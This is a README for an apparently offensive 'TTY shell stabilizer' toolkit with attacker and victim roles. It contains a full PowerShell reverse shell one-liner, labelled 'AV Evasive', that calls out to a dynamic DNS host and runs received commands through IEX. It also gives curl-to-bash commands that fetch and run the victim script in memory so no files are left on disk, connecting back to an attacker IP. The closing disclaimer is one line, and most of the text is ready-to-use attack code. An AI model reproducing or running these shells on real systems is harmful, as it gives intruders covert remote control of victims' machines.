# 🚀 TTY Shell Stabilizer Toolkit (Secure TLS Version)

A collection of scripts designed to automate the transition from a basic shell to a fully interactive TTY using **TLS encryption** and **password authentication**. This version uses a single-connection coordinated flow for maximum stability and interactive PTY support.

## 📂 Scripts


| Script | Role | Method |
|---|---|---|
| bash_tty.sh | Attacker | Socat TLS listener with `stty raw` for full TTY support. |
| victim.sh | Linux Victim | OpenSSL s_client + `/usr/bin/script` for interactive PTY. |
| Windows One-Liner | Windows Victim | PowerShell .NET SslStream (Direct Single Connection). |

------------------------------

## 🛠 Usage Instructions

### 1. Attacker Side (Listener)
The listener generates a temporary RSA certificate in RAM (`/dev/shm`), sets the local terminal to `raw` mode to pass all keystrokes (Tab, Ctrl+C, arrows), and waits for a connection.

**Usage:**
```bash
./bash_tty.sh <port> <password>
```
*Example:* `./bash_tty.sh 2222 mysecretpass`

------------------------------

## 2. Victim Side (Connection)

### 🐧 Linux (Interactive TTY)
On the target machine, providing the password will trigger an interactive TTY using `script`. This allows for `sudo`, `nano`, and tab-completion.

**Usage:**
```bash
./victim.sh <attacker_ip> <port> <password>
```
*Example:* `./victim.sh 10.0.13.7 2222 mysecretpass`

### 🪟 Windows (AV Evasive One-Liner)
This implementation uses native .NET classes to establish a single TLS tunnel. It is designed to work seamlessly with the attacker's raw terminal mode.

**One-Liner (Update variables):**
```powershell
$IP="x86david.ddns.net"; $P=2244; $pw="password"; $cb={$true}; try { $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $r=New-Object System.IO.StreamReader($tl); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; $w.WriteLine("READY"); if($r.ReadLine().Trim() -eq $pw){ while($c.Connected){ $w.Write("`r`nPS "+(pwd).Path+"> "); $w.Flush(); $t=""; while($c.Connected){ $k=$r.Read(); if($k -eq 13 -or $k -eq 10 -or $k -eq -1){break} if($k -eq 8){ if($t.Length -gt 0){ $t=$t.Substring(0,$t.Length-1); $w.Write("`b `b"); $w.Flush() } continue } $char=[char]$k; $t+=$char; $w.Write($char); $w.Flush() } if($t.Trim().Length -gt 0){ try{ $o=(IEX $t 2>&1 | Out-String); $w.Write("`r`n"+$o) }catch{ $w.Write("`r`n"+$_.Exception.Message) } } } } $c.Close() } catch { }
```

------------------------------

## 💡 Quick Tips

### Execution via Remote Pipe (Kali Attacker)
Download and run the listener in memory. Ensure you provide the port and password as arguments.
```bash
source <(curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/bash_tty.sh) 2222 mysecretpass
```

### Execution via Remote Pipe (Linux Victim)
Execute the shell directly in memory without leaving files on disk:
```bash
bash <(curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/victim.sh) 10.0.13.7 2222 mysecretpass
```

### Execution via CMD (Windows Victim)
Run the one-liner from a standard CMD prompt:
```cmd
$IP="x86david.ddns.net"; $P=2244; $pw="password"; $cb={$true}; try { $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $r=New-Object System.IO.StreamReader($tl); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; $w.WriteLine("READY"); if($r.ReadLine().Trim() -eq $pw){ while($c.Connected){ $w.Write("`r`nPS "+(pwd).Path+"> "); $w.Flush(); $t=""; while($c.Connected){ $k=$r.Read(); if($k -eq 13 -or $k -eq 10 -or $k -eq -1){break} if($k -eq 8){ if($t.Length -gt 0){ $t=$t.Substring(0,$t.Length-1); $w.Write("`b `b"); $w.Flush() } continue } $char=[char]$k; $t+=$char; $w.Write($char); $w.Flush() } if($t.Trim().Length -gt 0){ try{ $o=(IEX $t 2>&1 | Out-String); $w.Write("`r`n"+$o) }catch{ $w.Write("`r`n"+$_.Exception.Message) } } } } $c.Close() } catch { }
```

------------------------------

## 🔄 Automatic Re-listening
The attacker script is designed to be "eternal". After a session ends (by typing `exit`), the terminal is restored, and the listener automatically re-arms for the next victim.

## ⚠️ Terminal Recovery
If a session is interrupted and your terminal behaves strangely (e.g., no text visible or `Enter` not working), the script should auto-restore it. If not, manually run:
```bash
stty sane
# or
reset
```

------------------------------
**Disclaimer:** For authorized security testing and administrative purposes only.
